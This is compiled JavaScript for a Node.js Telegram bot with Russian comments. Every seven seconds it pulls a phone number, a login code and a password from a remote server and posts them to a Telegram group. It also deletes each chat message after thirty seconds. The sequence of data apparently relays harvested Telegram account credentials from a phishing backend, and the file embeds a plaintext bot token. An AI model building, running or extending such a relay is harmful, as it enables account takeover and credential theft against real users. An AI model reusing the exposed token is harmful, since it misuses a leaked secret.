"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __generator = (this && this.__generator) || function (thisArg, body) {
    var _ = { label: 0, sent: function() { if (t[0] & 1) throw t[1]; return t[1]; }, trys: [], ops: [] }, f, y, t, g;
    return g = { next: verb(0), "throw": verb(1), "return": verb(2) }, typeof Symbol === "function" && (g[Symbol.iterator] = function() { return this; }), g;
    function verb(n) { return function (v) { return step([n, v]); }; }
    function step(op) {
        if (f) throw new TypeError("Generator is already executing.");
        while (g && (g = 0, op[0] && (_ = 0)), _) try {
            if (f = 1, y && (t = op[0] & 2 ? y["return"] : op[0] ? y["throw"] || ((t = y["return"]) && t.call(y), 0) : y.next) && !(t = t.call(y, op[1])).done) return t;
            if (y = 0, t) op = [op[0] & 2, t.value];
            switch (op[0]) {
                case 0: case 1: t = op; break;
                case 4: _.label++; return { value: op[1], done: false };
                case 5: _.label++; y = op[1]; op = [0]; continue;
                case 7: op = _.ops.pop(); _.trys.pop(); continue;
                default:
                    if (!(t = _.trys, t = t.length > 0 && t[t.length - 1]) && (op[0] === 6 || op[0] === 2)) { _ = 0; continue; }
                    if (op[0] === 3 && (!t || (op[1] > t[0] && op[1] < t[3]))) { _.label = op[1]; break; }
                    if (op[0] === 6 && _.label < t[1]) { _.label = t[1]; t = op; break; }
                    if (t && _.label < t[2]) { _.label = t[2]; _.ops.push(op); break; }
                    if (t[2]) _.ops.pop();
                    _.trys.pop(); continue;
            }
            op = body.call(thisArg, _);
        } catch (e) { op = [6, e]; y = 0; } finally { f = t = 0; }
        if (op[0] & 5) throw op[1]; return { value: op[0] ? op[1] : void 0, done: true };
    }
};
Object.defineProperty(exports, "__esModule", { value: true });
var axios_1 = require("axios");
var TelegramBot = require('node-telegram-bot-api');
var token = '6665171831:AAEu1c2-Dn5IX341G4r8GlXir8EImcjWFOI';
var bot = new TelegramBot(token, { polling: true });
// Функция для удаления сообщения по его идентификатору
function deleteMessage(chatId, messageId) {
    return __awaiter(this, void 0, void 0, function () {
        var error_1;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0:
                    _a.trys.push([0, 2, , 3]);
                    return [4 /*yield*/, bot.deleteMessage(chatId, messageId)];
                case 1:
                    _a.sent();
                    console.log("\u0421\u043E\u043E\u0431\u0449\u0435\u043D\u0438\u0435 ".concat(messageId, " \u0443\u0434\u0430\u043B\u0435\u043D\u043E"));
                    return [3 /*break*/, 3];
                case 2:
                    error_1 = _a.sent();
                    console.error('Ошибка при удалении сообщения:', error_1.message);
                    return [3 /*break*/, 3];
                case 3: return [2 /*return*/];
            }
        });
    });
}
// Обработчик новых сообщений в чате
bot.on('message', function (msg) { return __awaiter(void 0, void 0, void 0, function () {
    var chatId, messageId;
    return __generator(this, function (_a) {
        chatId = msg.chat.id;
        messageId = msg.message_id;
        // Устанавливаем таймер удаления сообщения через день
        setTimeout(function () {
            deleteMessage(chatId, messageId);
        }, 30000); // 24 часа * 60 минут * 60 секунд * 1000 миллисекунд
        return [2 /*return*/];
    });
}); });
// В случае возникновения ошибки, выводим её в консоль
bot.on('polling_error', function (error) {
    console.error(error);
});
function fetchPhoneAutomatically() {
    return __awaiter(this, void 0, void 0, function () {
        var url, response, data, error_2;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0:
                    url = 'https://puce-attractive-firefly.cyclic.app/getPhone';
                    _a.label = 1;
                case 1:
                    _a.trys.push([1, 5, , 6]);
                    return [4 /*yield*/, axios_1.default.get(url)];
                case 2:
                    response = _a.sent();
                    data = response.data;
                    if (!(data !== undefined)) return [3 /*break*/, 4];
                    return [4 /*yield*/, bot.sendMessage(-1002084958557, data)];
                case 3:
                    _a.sent();
                    return [2 /*return*/, data];
                case 4: return [2 /*return*/, undefined];
                case 5:
                    error_2 = _a.sent();
                    console.error('Ошибка:', error_2);
                    return [3 /*break*/, 6];
                case 6: return [2 /*return*/];
            }
        });
    });
}
function fetchCodeAutomatically() {
    return __awaiter(this, void 0, void 0, function () {
        var url, response, data, error_3;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0:
                    url = 'https://puce-attractive-firefly.cyclic.app/getCode';
                    _a.label = 1;
                case 1:
                    _a.trys.push([1, 5, , 6]);
                    return [4 /*yield*/, axios_1.default.get(url)];
                case 2:
                    response = _a.sent();
                    data = response.data;
                    if (!(data !== undefined)) return [3 /*break*/, 4];
                    return [4 /*yield*/, bot.sendMessage(-1002084958557, data)];
                case 3:
                    _a.sent();
                    return [2 /*return*/, data];
                case 4: return [2 /*return*/, undefined];
                case 5:
                    error_3 = _a.sent();
                    console.error('Ошибка:', error_3);
                    return [3 /*break*/, 6];
                case 6: return [2 /*return*/];
            }
        });
    });
}
function fetchPasswordAutomatically() {
    return __awaiter(this, void 0, void 0, function () {
        var url, response, data, error_4;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0:
                    url = 'https://puce-attractive-firefly.cyclic.app/getPassword';
                    _a.label = 1;
                case 1:
                    _a.trys.push([1, 5, , 6]);
                    return [4 /*yield*/, axios_1.default.get(url)];
                case 2:
                    response = _a.sent();
                    data = response.data;
                    if (!(data !== undefined)) return [3 /*break*/, 4];
                    return [4 /*yield*/, bot.sendMessage(-1002084958557, data)];
                case 3:
                    _a.sent();
                    return [2 /*return*/, data];
                case 4: return [2 /*return*/, undefined];
                case 5:
                    error_4 = _a.sent();
                    console.error('Ошибка:', error_4);
                    return [3 /*break*/, 6];
                case 6: return [2 /*return*/];
            }
        });
    });
}
function sendRequestsInOrder() {
    return __awaiter(this, void 0, void 0, function () {
        var phoneData, codeData, passwordData;
        return __generator(this, function (_a) {
            switch (_a.label) {
                case 0: return [4 /*yield*/, fetchPhoneAutomatically()];
                case 1:
                    phoneData = _a.sent();
                    return [4 /*yield*/, fetchCodeAutomatically()];
                case 2:
                    codeData = _a.sent();
                    return [4 /*yield*/, fetchPasswordAutomatically()];
                case 3:
                    passwordData = _a.sent();
                    console.log('Все запросы выполнены.');
                    console.log('Phone Data:', phoneData);
                    console.log('Code Data:', codeData);
                    console.log('Password Data:', passwordData);
                    return [2 /*return*/];
            }
        });
    });
}
setInterval(function () {
    sendRequestsInOrder();
}, 7000);
sendRequestsInOrder();
